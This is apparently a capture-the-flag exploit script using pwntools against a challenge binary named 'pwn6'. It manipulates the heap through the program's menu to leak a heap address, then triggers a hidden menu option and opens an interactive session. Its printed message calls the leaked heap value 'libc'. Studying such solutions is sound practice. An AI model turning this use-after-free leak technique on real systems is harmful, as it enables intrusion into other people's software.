#!/usr/bin/env python
from pwn import *
import time

e , l = ELF('./pwn6') , ELF( 'libc-2.27.so' )

context.arch = 'amd64'
host , port = '10.140.0.8' , 11116
y = remote( host , port )
#y = process( './pwn6' )
#pause()

def add( data ):
    y.sendafter( '>' , '1' )
    y.sendafter( ':' , data )

def pri( idx ):
    y.sendafter( '>' , '2' )
    y.sendafter( ':' , str( idx ) )

def dle( idx ):
    y.sendafter( '>' , '3' )
    y.sendafter( ':' , str( idx ) )

def magic( idx ):
    y.sendafter( '>' , '7122' )
    y.sendafter( ':' , str( idx ) )


add( 'a' )
add( 'a' )
dle(0)
dle(1)

add( 'b' )
pri( 0 )


print y.recv(6)

heap = u64( y.recv(6) + '\x00\x00' ) - 0x262
success( 'libc -> %s' % hex( heap ) )

magic( 0 )


y.interactive()